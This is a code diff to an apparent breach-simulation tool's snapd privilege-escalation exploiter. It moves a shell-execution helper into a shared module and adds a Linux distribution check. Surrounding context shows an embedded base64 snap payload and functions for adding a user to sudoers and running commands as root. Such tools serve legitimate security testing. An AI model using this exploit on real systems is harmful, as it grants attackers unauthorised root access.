@@ -13,7 +13,7 @@ import subprocess
 from logging import getLogger
 from infection_monkey.pe import HostPrivExploiter
 from infection_monkey.model import REMOVE_LASTLINE, ADDUSER_TO_SUDOERS
-from infection_monkey.pe.tools import check_if_sudoer
+from infection_monkey.pe.tools import check_if_sudoer, shell, check_system, check_running
 
 LOG = getLogger(__name__)
 
@@ -45,20 +45,6 @@ AgAIAHNuYXAueWFtbAAAAAAAAAAAAwAAAAAAAAACAAYAaW5zdGFsbAAAAAAAAAAABgAAAJgAAAAB
 AAQAaG9va3MBAAAAAAAAAAEAAAB4AAAAAQADAG1ldGG4AAQAAQADAHNuYXAQgGAAAAAAAAAA4QQA
 AQAAAADaBgAAAAAAADiAeAAAAAAAAAA4AAAAAAAAAAAAAAAAAAAAWAAAAAAAAAC4AAAAAAAAAJgA
 AAAAAAAA2AAAAAAAAAD0BgAAAAAAAASA6AMAADYH'''+'A'*2990 + '==')
-
-
-def shell(cmd):
-    """
-    To run the command on the shell and to read the output.
-    :param cmd: The commands to be run on the shell
-    :return: returns the output
-    """
-    try:
-        result = os.popen(cmd).read()[:-1]
-        return result
-    except OSError as e:
-        LOG.error("Can't read from the shell!")
-        return False
 
 
 def create_sockfile():
@@ -247,6 +233,8 @@ def run_command_as_root(command):
 class SnapdExploiter(HostPrivExploiter):
     def __init__(self):
         self.file_path = ""
+        self.file_name = ""
+        self.runnableDistro = ("ubuntu", "linux")
 
     @staticmethod
     def try_priv_esc(self, command_line):
@@ -256,7 +244,12 @@ class SnapdExploiter(HostPrivExploiter):
         :param command_line: The command line to run the monkey in the format {dest_path  MONKEY_ARG  monkey_options}
         :return: True if the pe is successful
         """
+        # Check if the exploit can be tried on this distro
+        if not check_system(self.runnableDistro):
+            return False
+
         self.file_path = command_line.split(' ')[0]
+        self.file_name = self.file_path.split('/')[-1]
 
         # get the current user name
         whoami = shell("whoami")
